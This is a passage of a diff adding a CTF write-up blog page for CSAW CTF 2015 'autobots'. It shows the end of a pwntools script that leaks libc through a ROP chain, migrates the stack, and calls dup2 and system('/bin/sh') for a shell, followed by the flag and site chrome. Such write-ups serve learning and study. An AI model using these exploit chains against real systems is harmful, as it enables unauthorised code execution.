+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span> <span class="c"># leak write's GOT</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span> <span class="c"># write(6, write@got.plt, len)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span> <span class="c"># read the 3rd ROP chain to buffer2</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'read'</span><span class="p">])</span> <span class="c"># read(6, buffer2, len) </span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">)</span> <span class="c"># stack migration</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf2</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leave</span><span class="p">)</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+       
+        <span class="n">write_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)))</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"write_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">write_addr</span><span class="p">))</span>
+
+        <span class="c"># thanks to libc database</span>
+        <span class="c"># offset_system = 0x0000000000046640</span>
+        <span class="c"># offset_dup2 = 0x00000000000ebfe0</span>
+        <span class="c"># offset_read = 0x00000000000eb800</span>
+        <span class="c"># offset_write = 0x00000000000eb860</span>
+        <span class="c"># offset_str_bin_sh = 0x17ccdb</span>
+        
+        <span class="n">libc_base</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="mh">0xeb860</span>
+        <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x46640</span>
+        <span class="n">dup2_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xebfe0</span>
+        <span class="n">sh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x17ccdb</span>
+    
+        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"dup2_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">))</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"sh_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">))</span>
+        
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span> <span class="c"># dup2(6, 0)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span> <span class="c"># dup2(6, 1)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="c">#system("/bin/sh")</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+        <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>And finally we get the flag: <code class="highlighter-rouge">flag{c4nt_w4it_f0r_cgc_7h15_y34r}</code><br />
+CGC huh, well…I’m not sure about that :/ but anyway this is a pretty good challenge :)</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#csaw" class="page__taxonomy-item" rel="tag">CSAW</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ppc" class="page__taxonomy-item" rel="tag">PPC</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#rop" class="page__taxonomy-item" rel="tag">ROP</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2015-09-22T23:33:00+08:00">September 22, 2015</time></p>
+        
+      </footer>
+
+      <!-- /usr/gem/gems/minimal-mistakes-jekyll-4.13.0/_includes/social-share.html -->
+<!-- Remove linkdin shared button -->
+<section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=CSAW+CTF+2015+--+autobots%20http%3A%2F%2F0.0.0.0%3A4000%2Fcsaw-ctf-2015-autobots%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fcsaw-ctf-2015-autobots%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2Fcsaw-ctf-2015-autobots%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/csaw-ctf-2015-wyvern/" class="pagination--pager" title="CSAW CTF 2015 – wyvern
+">Previous</a>
+    
+    
+      <a href="/hacklu-ctf-2015-secret-library/" class="pagination--pager" title="Hack.lu CTF 2015 – secret library
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/hxp-CTF-2017-hardened-flag-store/" rel="permalink">hxp CTF 2017 – hardened_flag_store
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/MeePwn-CTF-2017-Brainfuck-1-2/" rel="permalink">MeePwn CTF 2017 – Brainfuck 1 &amp; 2
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+      </div>
+    </div>
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/csaw-ctf-2015-autobots/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "/csaw-ctf-2015-autobots"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+      var d = document, s = d.createElement('script');
+      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+  </body>
+</html>
